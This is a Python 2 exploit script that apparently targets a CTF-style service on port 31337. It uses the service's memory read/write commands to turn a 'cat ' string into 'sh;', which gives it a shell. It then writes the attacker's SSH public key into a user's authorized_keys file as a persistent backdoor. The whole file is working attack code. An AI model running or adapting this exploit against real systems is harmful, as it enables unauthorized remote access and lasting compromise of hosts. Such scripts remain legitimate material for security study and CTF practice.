#!/usr/bin/env python

import sys, subprocess, time

if len(sys.argv) < 2:
    print "Usage: %s <ip>" % sys.argv[0]
    sys.exit(1)

def strToAddr(inp):
    return "0x" + "".join(["%02x" % ord(x) for x in reversed(list(inp))])

p = subprocess.Popen(["nc", sys.argv[1], "31337"], stdout = subprocess.PIPE, stdin = subprocess.PIPE)

start = 0xbffffff0
offsetmin = 0
offsetmax = 1000

payload = "mkdir -p /home/dobby/.ssh/; echo '%s' > /home/dobby/.ssh/authorized_keys" % open("/Users/deepstar/.ssh/id_rsa.pub").read().strip("\r\n")

# get rid of the header
line = p.stdout.readline().strip("\r\n")
line = p.stdout.readline().strip("\r\n")
while not line == "":
    line = p.stdout.readline().strip("\r\n")

# Find right address and replace "cat " by "sh;\x00"
for i in range(offsetmin, offsetmax):
    sys.stdout.write("\rAddress %d (max = %d): %s" % (i, offsetmax, hex(start - i)))
    p.stdin.write("r %s\n" % hex(start - i))
    line = "[%s]" % p.stdout.readline().strip("\r\n")
    parts = line.split(" ")
    if len(parts) == 4:
        val = parts[3]
	if strToAddr("cat ") in val:
	    print ""
	    print "[WRITING] w %s %s" % (hex(start - i), strToAddr("sh;\x00"))
	    p.stdin.write("w %s %s\n" % (hex(start - i), strToAddr("sh;\x00")))
	    print "[READ] [%s]" % p.stdout.readline().strip("\r\n")
	    p.stdin.write("r %s\n" % hex(start - i))
	    print "[READ] [%s]" % p.stdout.readline().strip("\r\n")

# spawn shell
print ""
print "[Spawning shell]"
p.stdin.write("s\n")

print "[Executing payload]"
p.stdin.write("%s\n" % payload)

print "[Syncing]"
time.sleep(1)

print "Done."

